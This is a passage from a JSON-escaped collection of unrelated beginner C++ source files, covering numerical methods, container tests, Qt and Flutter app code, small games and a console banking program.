_type = (uint8_t*)malloc(numBytes);\n    memcpy(_type, type, numBytes);\n    _typeLength = numBytes;\n}\n\n// assumes the caller siz",
    "#include \"Bisection.h\"\r\n#include <iostream>\r\n#include <iomanip>\r\n#include <math.h>\r\n\r\nusing namespace std;\r\n\r\ndouble my_func(double x)\r\n{\r\n\treturn sin(x);\r\n}\r\n\r\ndouble my_func2(double x)\r\n{\r\n\treturn x * x * x - sin(x);\r\n}\r\n\r\nint main()\r\n{\r\n\tBisection b(0, 3, 1E-5); //Instantiating with [0,3] interval, and tolerance 0.00001\r\n\tdouble root = b.findRoot(); //Firstly checking the default function\r\n\tcout << fixed << setprecision(10);\r\n\tcout << \"The root for the default function sin^2(x) + x^3 - exp(x) is : \" << root << endl;\r\n\tb.setTolerance(1E-10);\r\n\troot = b.findRoot(); \r\n\tcout << \"\\nThe root value is now :\" << root << endl; //With our new tolerances\r\n\t//Trying again, with two new functions\r\n\tb.setBracket(3, 4);\r\n\troot = b.findRoot(my_func);\r\n\tcout << \"\\nThe root for sin(x) in the range [3,4] is : \" << root << endl;\r\n\tb.setBracket(0.5, 1.5);\r\n\troot = b.findRoot(my_func2);\r\n\tcout << \"\\nThe root for x^3 - sin(x) in range [0.5,1.5] is : \" << root << endl;\r\n\tsystem(\"PAUSE\"); \r\n\r\n\treturn EXIT_SUCCESS;\r\n}",
    "\n#include <iostream>\n\n/* ************************************************************************** */\n\n#include \"../container/container.hpp\"\n#include \"../container/testable.hpp\"\n#include \"../container/dictionary.hpp\"\n#include \"../container/traversable.hpp\"\n#include \"../container/mappable.hpp\"\n#include \"../container/linear.hpp\"\n\n#include \"../vector/vector.hpp\"\n\n#include \"../list/list.hpp\"\n\n/* ************************************************************************** */\n\nusing namespace std;\n\n/* ************************************************************************** */\n\nvoid stestVectorInt(uint & testnum, uint & testerr) {\n  uint loctestnum = 0, loctesterr = 0;\n  cout << endl << \"Begin of Vector<int> Test:\" << endl;\n  try {\n    {\n      lasd::SortableVector<int> vec;\n      Empty(loctestnum, loctesterr, vec, true);\n\n      GetFront(loctestnum, loctesterr, vec, false, 0);\n      GetBack(loctestnum, loctesterr, vec, false, 0);\n      SetAt(loctestnum, loctesterr, vec, false, 1, 0);\n      GetAt(loctestnum, loctesterr, vec, false, 2, 0);\n\n      Exists(loctestnum, loctesterr, vec, false, 0);\n\n      TraversePreOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n      TraversePostOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n\n      FoldPreOrder(loctestnum, loctesterr, vec, true, &FoldAdd<int>, 0, 0);\n      FoldPostOrder(loctestnum, loctesterr, vec, true, &FoldAdd<int>, 0, 0);\n    }\n    {\n      lasd::SortableVector<int> vec(3);\n      Empty(loctestnum, loctesterr, vec, false);\n      Size(loctestnum, loctesterr, vec, true, 3);\n\n      SetAt(loctestnum, loctesterr, vec, true, 0, 4);\n      SetAt(loctestnum, loctesterr, vec, true, 1, 3);\n      SetAt(loctestnum, loctesterr, vec, true, 2, 1);\n\n      GetFront(loctestnum, loctesterr, vec, true, 4);\n      GetBack(loctestnum, loctesterr, vec, true, 1);\n\n      SetFront(loctestnum, loctesterr, vec, true, 5);\n      SetBack(loctestnum, loctesterr, vec, true, 4);\n\n      Exists(loctestnum, loctesterr, vec, true, 4);\n\n      TraversePreOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n      TraversePostOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n      FoldPreOrder(loctestnum, loctesterr, vec, true, &FoldAdd<int>, 0, 12);\n      FoldPostOrder(loctestnum, loctesterr, vec, true, &FoldMultiply<int>, 1, 60);\n\n      vec.Sort();\n\n      TraversePreOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n      TraversePostOrder(loctestnum, loctesterr, vec, true, &TraversePrint<int>);\n\n      vec.Resize(2);\n      FoldPostOrder(loctestnum, loctesterr, vec, true, &FoldMultiply<int>, 1, 12);\n    }\n  }\n  catch (...) {\n    loctestnum++; loctesterr++;\n    cout << endl << \"Unmanaged error! \" << endl;\n  }\n  cout << \"End of Vector<int> Test! (Errors/Tests: \" << loctesterr << \"/\" << loctestnum << \")\" << endl;\n  testnum += loctestnum;\n  testerr += loctesterr;\n}\n\nvoid stestVectorDouble(uint & testnum, uint & testerr) {\n  uint loctestnum = 0, loctesterr = 0;\n  cout << endl << \"Begin of Vector<double> Test:\" << endl;\n  try {\n    lasd::SortableVector<double> vec(3);\n    Empty(loctestnum, loctesterr, vec, false);\n    Size(loctestnum, loctesterr, vec, true, 3);\n\n    SetAt(loctestnum, loctesterr, vec, true, 0, 5.5);\n    SetAt(loctestnum, loctesterr, vec, true, 1, 3.3);\n    SetAt(loctestnum, loctesterr, vec, true, 2, 1.1);\n\n    GetFront(loctestnum, loctesterr, vec, true, 5.5);\n    GetBack(loctestnum, loctesterr, vec, true, 1.1);\n\n    Exists(loctestnum, loctesterr, vec, true, 3.3);\n\n    FoldPreOrder(loctestnum, loctesterr, vec, true, &FoldAdd<double>, 0.0, 9.9);\n    FoldPostOrder(loctestnum, loctesterr, vec, true, &FoldMultiply<double>, 1.0, 19.965);\n  }\n  catch (...) {\n    loctestnum++; loctesterr++;\n    cout << endl << \"Unmanaged error! \" << endl;\n  }\n  cout << \"End of Vector<double> Test! (Errors/Tests: \" << loctesterr << \"/\" << loctestnum << \")\" << endl;\n  testnum += loctestnum;\n  testerr += loctesterr;\n}\n\nvoid stestVectorString(uint & testnum, uint & testerr) {\n  uint loctestnum = 0, loctesterr = 0;\n  cout << endl << \"Begin of Vector<string> Test:\" << endl;\n  try {\n    lasd::SortableVector<string> vec(2);\n\n    Empty(loctestnum, loctesterr, vec, false);\n    Size(loctestnum, loctesterr, vec, true, 2);\n\n    SetAt(loctestnum, loctesterr, vec, true, 0, string(\"A\"));\n    SetAt(loctestnum, loctesterr, vec, true, 1, string(\"B\"));\n\n    GetFront(loctestnum, loctesterr, vec, true, string(\"A\"));\n    GetBack(loctestnum, loctesterr, vec, true, string(\"B\"));\n\n    Exists(loctestnum, loctesterr, vec, true, string(\"A\"));\n\n    MapPreOrder(loctestnum, loctesterr, vec, true, [](string & str) { MapStringAppend(str, string(\" \")); });\n    TraversePreOrder(loctestnum, loctesterr, vec, true, &TraversePrint<string>);\n    FoldPreOrder(loctestnum, loctesterr, vec, true, &FoldStringConcatenate, string(\"X\"), string(\"XA B \"));\n    FoldPostOrder(loctestnum, loctesterr, vec, true, &FoldStringConcatenate, string(\"X\"), string(\"XB A \"));\n\n    Exists(loctestnum, loctesterr, vec, false, ",
    "#include \"jsonParser.h\"\r\n\r\nString recived_payload;\r\n\r\n\r\n//********************************************** Serialized JSON Payload***********************//\r\nString serialize_Payload(float batt_voltage, float batt_persent, float temp, float hum) {\r\n  String transmitt_Payload = \"\";\r\n\r\n  StaticJsonDocument<JSON_DOCUMENT_SIZE> doc;\r\n  JsonObject root = doc.to<JsonObject>();\r\n  root [\"ID\"] = DEVICE_ID;\r\n  root [\"BV\"] = round2(batt_voltage);\r\n  root [\"BP\"] = batt_persent;\r\n  root [\"TM\"] = round2(temp);\r\n  root [\"HM\"] = round2(hum);\r\n  serializeJson(doc, transmitt_Payload);\r\n  root.clear();\r\n  //  Serial.print(F(\"Publishing To Broker: \"));\r\n  Serial.println(transmitt_Payload);\r\n  return transmitt_Payload;\r\n\r\n}\r\n\r\ndouble round2(double value) {\r\n  return (int)(value * 100 + 0.5) / 100.0;\r\n}\r\n\r\n\r\n//******************************************************** deserialized JSON Payload ******************************************//\r\nvoid deserialize_Payload() {\r\n  StaticJsonDocument<JSON_DOCUMENT_SIZE> doc;\r\n  if ( !strcmp( recived_payload.c_str(), \"false\" ) ) {\r\n    Serial.println(\"Error\");\r\n  }\r\n  else {\r\n    DeserializationError error = deserializeJson(doc, recived_payload);\r\n    if (error) {\r\n      Serial.print(F(\"deserializeJson() failed\"));\r\n      Serial.println(error.f_str());\r\n    }\r\n    else {\r\n\r\n      Serial.println(recived_payload);\r\n      //      jsonVehicle_ID = (const char*)doc[\"GID\"];\r\n      //      json_TS = doc[\"TS\"]; // 0\r\n\r\n    }\r\n  }\r\n}\r\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QFileInfo>\n#include <QMessageBox>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    ui->saveButton->hide();\n    ui->saveButton2->hide();\n    ui->cancelButton1->hide();\n    ui->cancelButton2->hide();\n\n    QSqlDatabase db = QSqlDatabase::addDatabase(\"QSQLITE\");\n    db.setDatabaseName(\"C://Users//User//Downloads//SSIS-2-main//SSIS-2-main//m//mainwindow.db\");\n\n    if (!db.open()) {\n        qDebug() << \"Error opening database:\" << db.lastError().text();\n        return;\n    }\n\n    QSqlQuery query(\"SELECT * FROM Students1\");\n\n    if (!query.exec()) {\n        qDebug() << \"Error executing query:\" << query.lastError().text();\n        db.close();\n        return;\n    }\n\n    ui->studentT->setRowCount(0);\n\n    ui->studentT->setColumnCount(7);\n    ui->studentT->setHorizontalHeaderLabels({\"Last Name\", \"First Name\", \"Middle Name\", \"ID Number\", \"Gender\", \"Year Level\", \"Course\"});\n\n    int row = 0;\n    while (query.next()) {\n        QString LastName = query.value(\"Surname\").toString();\n        QString FirstName = query.value(\"FirstName\").toString();\n        QString MiddleName = query.value(\"MiddleName\").toString();\n        QString IDNumber = query.value(\"IDNumber\").toString();\n        QString Gender = query.value(\"Gender\").toString();\n        QString YearLevel = query.value(\"YearLevel\").toString();\n        QString CourseCode = query.value(\"CourseCode\").toString();\n\n        ui->studentT->insertRow(row);\n\n        ui->studentT->setItem(row, 0, new QTableWidgetItem(LastName));\n        ui->studentT->setItem(row, 1, new QTableWidgetItem(FirstName));\n        ui->studentT->setItem(row, 2, new QTableWidgetItem(MiddleName));\n        ui->studentT->setItem(row, 3, new QTableWidgetItem(IDNumber));\n        ui->studentT->setItem(row, 4, new QTableWidgetItem(Gender));\n        ui->studentT->setItem(row, 5, new QTableWidgetItem(YearLevel));\n        ui->studentT->setItem(row, 6, new QTableWidgetItem(CourseCode));\n\n        row++;\n    }\n\n    //ui->tableWidget->resizeColumnsToContents();\n\n    query.finish();\n\n    QSqlQuery queryCourses(db);\n    queryCourses.prepare(\"SELECT * FROM Course2\");\n\n    if (!queryCourses.exec()) {\n        qDebug() << \"Error executing courses query:\" << queryCourses.lastError().text();\n        db.close();\n        return;\n    }\n\n    ui->courseT->setRowCount(0);\n    ui->courseT->setColumnCount(2);\n    ui->courseT->setHorizontalHeaderLabels({\"Course Code\", \"Course Name\"});\n\n    row = 0;\n    while (queryCourses.next()) {\n        QString courseCode = queryCourses.value(\"CourseCode\").toString();\n        QString courseName = queryCourses.value(\"CourseName\").toString();\n\n        ui->courseT->insertRow(row);\n\n        ui->courseT->setItem(row, 0, new QTableWidgetItem(courseCode));\n        ui->courseT->setItem(row, 1, new QTableWidgetItem(courseName));\n\n        row++;\n    }\n    ui->courseT->resizeColumnsToContents();\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\nvoid MainWindow::on_addButton1_clicked()\n{\n    // Retrieve values from input fields or widgets\n    QString lastName = ui->lastName->text();\n    QString firstName = ui->firstName->text();\n    QString middleName = ui->middleName->text();\n    QString idNumber = ui->ID->text();\n    QString gender = ui->gender->currentText();\n    QString yearLevel = ui->yrLvl->currentText();\n    QString courseCode = ui->course->text();\n\n    // Open the database connection\n    QSqlDatabase db = QSqlDatabase::database();\n    if (!db.isOpen()) {\n        qDebug() << \"Database not open!\";\n        return;\n    }\n\n    // Check if the ID number is in the correct format (xxxx-xxxx)\n    static QRegularExpression idRegex(\"\\\\d{4}-\\\\d{4}\"); // Regular expression to match the pattern xxxx-xxxx\n    if (!idRegex.match(idNumber).hasMatch()) {\n        // ID number is not in the correct format, display a message to the user\n        QMessageBox::warning(this, \"Invalid ID Number\", \"Please enter a valid ID number in the format xxxx-xxxx (e.g., 2022-0001).\");\n        return;\n    }\n\n    // Check if the course code is in the correct format (XXXX)\n    static QRegularExpression courseRegex(\"[A-Za-z]{4}\"); // Regular expression to match the pattern XXXX\n    if (!courseRegex.match(courseCode).hasMatch()) {\n        // Course code is not in the correct format, display a message to the user\n        QMessageBox::warning(this, \"Invalid Course Code\", \"Please enter a valid course code in the format XXXX (e.g., BSCS).\");\n        return;\n    }\n\n    // Check if the ID already exists in the database\n    QSqlQuery checkQuery(db);\n    checkQuery.prepare(\"SELECT IDNumber FROM Students1 WHERE IDNumber = :idNumber\");\n    checkQuery.bindValue(\":idNumber\", idNumber);\n    if (!checkQuery.exec()) {\n        qDebug() << \"Error executing query to check ID existence:\" << checkQuery.lastError().text();\n        return;\n    }\n\n    if (checkQuery.next()) {\n        // ID already exists, display a message to the user\n ",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"logger.h\"\n#include <cassert>\n\nusing namespace logger;\n\nint main()\n{\n\n{\n    std::cout << \"\\tSingleton check: only one instance of logger is allowed\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Trace level enabled, color output of all events must be shown\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_tr = Logger::Init(LogLevel::TRACE_LEVEL, LOG_TO_CONSOLE);\n    log_tr->Trace(\"trace event\");\n    log_tr->Debug(\"debug event\");\n    log_tr->Info(\"info event\");\n    log_tr->Error(\"error event\");\n    log_tr->Fatal(\"fatal event\");\n    std::cout << \"\\t___________________\" << std::endl;\n    std::cout << \"\\t Attempt to create another instance with Fatal level,\"<<std::endl;\n    std::cout<< \"\\t Must be no changes in output\" << std::endl;\n    std::cout << \"\\t___________________\" << std::endl;\n    Logger *log_ft = Logger::Init(LogLevel::FATAL_LEVEL, LOG_TO_CONSOLE);\n    log_ft->Trace(\"trace event\");\n    log_ft->Debug(\"debug event\");\n    log_ft->Info(\"info event\");\n    log_ft->Error(\"error event\");\n    log_ft->Fatal(\"fatal event\");\n    assert(log_tr==log_ft);\n}\n\n}",
    "#include <iostream>\nusing namespace std;\n\n// Fungsi untuk mencari pbb dengan menggunakan algoritma Euclidean\nint fpbeuclidean(int m, int n) { \n   int r;\n   while (n != 0) { \n      r = m % n; // var nampung hasil sisa pembagian dari m dan n \n      m = n; // var untuk bilangan positif yang ingin dicari FPB-Nya\n      n = r; //masukkan nilai r kedalam variabel n.\n   }\n   \n   return m; //Hasil FPB dari m dan n adalah nilai m.\n}\n\nint main() {\n   char ulangin; //variabel untuk melakukan perulangan untuk jalanin program ya/tidak\n   do { // untuk melakukan looping pada opsi ingin melakukan program perulangan/tidak\n\n      system(\"cls\");\n      \n      int m, n; // m untuk nampung bilangan ke 1 dan n untuk bilangan ke2\n//masukkan bilangan 1 dan bilangan 2\n      cout << \"==============KALKULATOR MENCARI FPB================\" << endl;\n      cout << \"Masukkan bilangan pertama : \";\n        cin >> m;\n      cout << \"Masukkan bilangan kedua : \";\n         cin >> n;\n\n      int fpb = fpbeuclidean(m, n); //variabel fpb untuk meyimpan hasil dari fungsi fpbeuclidean yang dimana fungsi ini\n      //sambungan penjelasan pendeklarasian diatas --> untuk meneruskan var m dan var n\n\n    //setelah hasil fpb telah didapat dan disimpan di var fpb tadi yang diatas itu \n      cout << \"\\nHasil faktor persekutuan terbesar dari \" << m << \" dan \" << n << \" adalah \" << fpb << endl; //tampilin hasil fpb-Nya\n\n      // Request ingin melakukan perulangan atau tidak\n      cout << \"Apakah ingin melakukan perulangan pada program ini? (y/t): \";\n        cin >> ulangin;\n   } \n   \n   //opsi melakukan ulangin program atau tidak\n   while (ulangin == 'Y' || ulangin == 'y'); // looping melakukan opsi perulangan program fpb \n    cout << \"================================================================\" << endl;\n        cout << \"Terimakasih user sudah melakukan perintah pada program ini\";\n\n   return 0;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"newgit\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Forward declarations for use in the future\nclass Constituency;\nclass Vehicle;\n\nclass Person {\nprotected:\n    string name;\npublic:\n    Person(const string& name) : name(name) {}\n\n    virtual Constituency* getConstituency() const = 0;\n    virtual string getDriver() const {\n        return \"Car Driver\"; \n     }\n    virtual bool exceedsSpendingLimit() const = 0;\n    string getName() const { \n        return name; \n    } // Public member function to access name\n};\n\nclass MP : public Person {\nprotected:\n    Constituency* constituency;\npublic:\n    int spendingCost;      // Moved spendingCost here\n\n    MP(const string& name, Constituency* constituency) : Person(name), constituency(constituency), spendingCost(0) {}\n\n    Constituency* getConstituency() const override {\n        return constituency;\n    }\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 100000;     // 1 lakh spending limit for MP\n    }\n};\n\nclass Minister : public MP {\npublic:\n    Minister(const string& name, Constituency* constituency) : MP(name, constituency) {}\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 1000000;       // 10 lakhs spending limit for Minister\n    }\n};\n\nclass PrimeMinister : public Minister {\npublic:\n    PrimeMinister(const string& name, Constituency* constituency) : Minister(name, constituency) {}\n\n    string getDriver() const override \n    { \n        return \"Car Driver and Aircraft Pilot\"; \n    }\n\n    bool exceedsSpendingLimit() const override {\n        return spendingCost > 10000000;     // 1 crore spending limit for Prime Minister\n    }\n\n    bool givePermissionToArrest(const Minister* minister) {\n        // Prime Minister can give permission to arrest a Minister if the Minister crosses the spending limit\n        return (minister->exceedsSpendingLimit());\n    }\n};\n\nclass Commissioner {\npublic:\n    void canArrest(const vector<Person*>& persons) const {\n        for (const auto& person : persons) {\n            if (person->exceedsSpendingLimit())\n                cout << person->getName() << \" can be arrested\" << endl; // Access name here using public member function\n            else\n                cout << person->getName() << \" is within the spending limit\" << endl; // Access name using public member function\n        }\n    }\n};\n\nclass Constituency {\n    string name;\npublic:\n    Constituency(const string& name) : name(name) {}\n\n    string getName() const {\n        return name;\n    }\n};\n\nclass Vehicle {\n    string driverName;\n    string type;\npublic:\n    Vehicle(const string& driverName, const string& type) : driverName(driverName), type(type) {}\n\n    string getDriver() const {\n        return driverName;\n    }\n};\n\nint main() {\n    // Creating constituencies\n    Constituency* constituency1 = new Constituency(\"Constituency 1\");\n    Constituency* constituency2 = new Constituency(\"Constituency 2\");\n\n    // Creating persons\n    MP mp1(\"MP1\", constituency1);\n    Minister minister1(\"Minister1\", constituency1);\n    PrimeMinister pm(\"Prime Minister\", constituency2);\n\n    // Additional cases\n    MP mp2(\"MP2\", constituency2);\n    Minister minister2(\"Minister2\", constituency2);\n\n    // Setting spending costs\n    mp1.spendingCost = 90000;  // under limit\n    minister1.spendingCost = 1100000;  // above limit\n    pm.spendingCost = 8500000;  // under limit\n\n    mp2.spendingCost = 12000000;  // above limit\n    minister2.spendingCost = 900000;  // under limit\n\n    //vector of persons(MP,Minister, PM)\n    vector<Person*> persons = {&mp1, &minister1, &pm, &mp2, &minister2};\n\n    // Creating a commissioner and check who can be arrested\n    Commissioner commissioner;\n    commissioner.canArrest(persons);\n\n    // Prime Minister can give permission to arrest\n    cout << \"Does Prime Minister give permission to arrest Minister1 ? \";\n    if (pm.givePermissionToArrest(&minister1))\n        cout << \"Yes, Prime Minister gives permission.\" << endl;\n    else\n        cout << \"No, Prime Minister should give permission to arrest.\" << endl;\n\n    cout << \"Does Prime Minister give permission to arrest Minister2 ? \";\n    if (pm.givePermissionToArrest(&minister2))\n        cout << \"Yes, Prime Minister gives permission.\" << endl;\n    else\n        cout << \"No, Prime Minister should give permission.\" << endl;\n\n    \n\n    return 0;\n}\n",
    "#include \"ClapTrap.hpp\"\n\n\nClapTrap::ClapTrap(void) : name(\"Anonymous\"), hit_points(10), energy_points(10), attack_damage(0)\n{   \n#ifdef TRACE\n    std::cout << \"ClapTrap - Anonymous - Constructed.\" << std::endl;\n#endif\n}\n\nClapTrap::ClapTrap(std::string theName) : name(theName), hit_points(10), energy_points(10), attack_damage(0)\n{\n#ifdef TRACE2\n    std::cout << \"ClapTrap - \" << name << \" - Constructed.\" << std::endl;\n#endif\n}\n\n//Copy constructor implementor.\nClapTrap::ClapTrap(const ClapTrap &other) \n{\n    *this = other;\n#ifdef TRACE \n    std::cout << \"ClapTrap \" << other.name << \" copied using the copy constructor.\" << std::endl;\n#endif\n}\n\n//Copy Assignment Operator\nClapTrap &ClapTrap::operator=(const ClapTrap  &other)\n{\n    if (this != &other)\n    {\n        name = other.name;\n        hit_points = other.hit_points;\n        energy_points = other.energy_points;\n        attack_damage = other.attack_damage;\n    }\n#ifdef TRACE \n    std::cout << \"ClapTrap \" << other.name << \" assigned using the assignment operator.\" << std::endl;\n#endif\n    return *this;\n}\n\nClapTrap::~ClapTrap()\n{\n#ifdef TRACE2\n    std::cout << \"ClapTrap \" << name << \" destroyed.\" << RESET << std::endl;\n#endif\n}\n\nvoid    ClapTrap::attack(const std::string &target)\n{\n    (std::string)target;\n    if (energy_points > 0)\n    {\n        -- energy_points;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" attacks \" << target << \", causing \" << attack_damage << \" hit points damage!. Current energy points for \" << name << \" is \" << energy_points << \".\" << std::endl;\n#endif\n    }\n    else\n    {\n        ;\n#ifdef TRACE        \n        std::cout << \"ClapTrap \" << name << \" has no energy points needed for an attack.\" << std::endl;\n#endif\n    }\n}\n\nvoid    ClapTrap::takeDamage(unsigned int amount)\n{\n    if (amount > hit_points)\n        hit_points = 0;\n    else\n        hit_points -= amount;\n    if (energy_points != 0)\n        -- energy_points; \n#ifdef TRACE\n    std::cout << \"ClapTrap \" << name << \" has \" << hit_points << \" hit points and \" << energy_points << \" energy points left.\" << std::endl;\n#endif\n    if (!testLife())\n        return ;\n    if (!hit_points)\n        beRepaired(amount);\n}\n\nvoid    ClapTrap::beRepaired(unsigned int amount)\n{\n    if (energy_points > 0)\n    {\n        -- energy_points;\n        hit_points += amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was repaired by transforming 1 energy point to \" << amount << \" hit points. Current energy points for \" << name << \" is \" << energy_points << \".\" << std::endl;\n#endif\n    }\n    else\n        testLife();\n}\n\nbool    ClapTrap::hasEnergy(void)\n{\n    return (energy_points > 0);\n}\n\nbool    ClapTrap::hasHitPoints(void)\n{\n    return (hit_points > 0);\n}\n\nvoid        ClapTrap::setHitPoints(unsigned int amount)\n{\n    hit_points = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was set \" << amount << \" hit points.\" << std::endl;\n#endif    \n}\n\nvoid        ClapTrap::setEnergyPoints(unsigned int amount)\n{\n    energy_points = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" was set \" << amount << \" energy points.\"  << std::endl;\n#endif\n}\n\nvoid        ClapTrap::setAttackDamage(unsigned int amount)\n{\n    attack_damage = amount;\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" attack damage is set to \" << amount << \".\" << std::endl;\n#endif\n}\n\nunsigned    ClapTrap::getHitPoints(void)\n{\n    return (hit_points);\n}\n\nunsigned    ClapTrap::getEnergyPoints(void)\n{\n    return (energy_points);\n}\n\nunsigned    ClapTrap::getAttackDamage(void)\n{\n    return (attack_damage);\n}\n\nstd::string ClapTrap::getName(void)\n{\n    return (name);\n}\n\nbool        ClapTrap::testLife(void)\n{\n    if (!energy_points && !hit_points)\n    {\n#ifdef TRACE\n        std::cout << \"ClapTrap \" << name << \" has depleted hit points and energy points. It is a TKO!\" << std::endl << std::endl;\n#endif        \n        return (false);\n    }\n    return (true);\n}",
    "#include <iostream>\n#include <conio.h>\n#include <stdio.h>\n#include <fstream>\n#include <string>\n#include <windows.h>\nusing namespace std;\nclass Bank\n{\nprivate:\n    int id, ps;\n    fstream file;\n    string name, userData;\n\npublic:\n    void display();\n    Bank()\n\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n\n    ~Bank()\n    {\n        file.close();\n    }\n    void Invalid();\n    int menu();\n    void run_menu();\n    void singUp();\n    void new_user();\n    void LogIn();\n\n} b;\nclass B\n{\nprivate:\n    int *balance;\n    string userData;\n    fstream file;\n\npublic:\n    B()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n        balance = new int(100);\n    }\n    ~B()\n    {\n        // file.close();\n        delete balance;\n    }\n    int bank_managment();\n    void run_bank();\n    void deposit();\n    void withdraw();\n    void Payment();\n    int *get();\n} bm;\nclass atm\n{\nprivate:\n    string userData;\n    fstream file;\n\npublic:\n    atm()\n    {\n        userData = \"example_data\";\n        file.open(\"userData.txt\", ios::in | ios::app | ios::out);\n\n        if (!file.is_open())\n        {\n            cerr << \"Error: Unable to open file userData.txt\\n\";\n            // Handle the error, maybe throw an exception or exit the program\n        }\n    }\n    ~atm()\n    {\n        file.close();\n    }\n    void log_atm();\n    int atm_management();\n    void run();\n} a;\n\nvoid star()\n{\n    cout << \"===============================================================================\\n\";\n}\nint main()\n{\n    system(\"cls\");\n    b.run_menu();\n\n    return 0;\n}\n//////////////////////////////class Bank//////////////////////////\nint Bank::menu()\n{\n    int choice;\n    cout << \"\\t\\t\\t control panle \\n\\n\";\n    star();\n    cout << \"1.Bank management \\n\";\n    cout << \"2.Atm management \\n\";\n    cout << \"3.Exit \\n\";\n    cout << \"Enter your choic  \";\n    cin >> choice;\n    star();\n    return choice;\n}\nvoid Bank::run_menu()\n{\n    //  system(\"cls\");\n    int c = menu();\n    if (c == 1)\n    {\n        LogIn();\n        // bm.run_bank();\n        // // break;\n    }\n    else if (c == 2)\n    {\n        a.run();\n    }\n    else if (c == 3)\n    {\n        exit(0);\n    }\n    else\n    {\n        cout << \"Invalid choice tray agine \\n\";\n    }\n}\nvoid Bank::singUp()\n{\n    string user_name;\n    int ps, pin;\n\n    cout << \"sing up in Account \\n\";\n    cout << \"User name  \";\n    cin >> user_name;\n    cout << \"\\nID \\n\";\n    cin >> pin;\n\n    cout << \"\\nEnter password\\n\";\n    cin >> ps;\n\n    file << user_name << \" \" << pin << \" \" << ps << \"\\n\";\n}\nvoid Bank::LogIn()\n{\n    star();\n    cout << \"Enter your name ,id ,password\\n\";\n    cin >> name >> id >> ps;\n    // b.Invalid();\n    string namee;\n    int iD, pass;\n    bool found = false;\n    // Loop through the file to check data\n    while (file >> namee >> iD >> pass)\n    {\n        if (name == namee && id == iD && ps == pass)\n        {\n           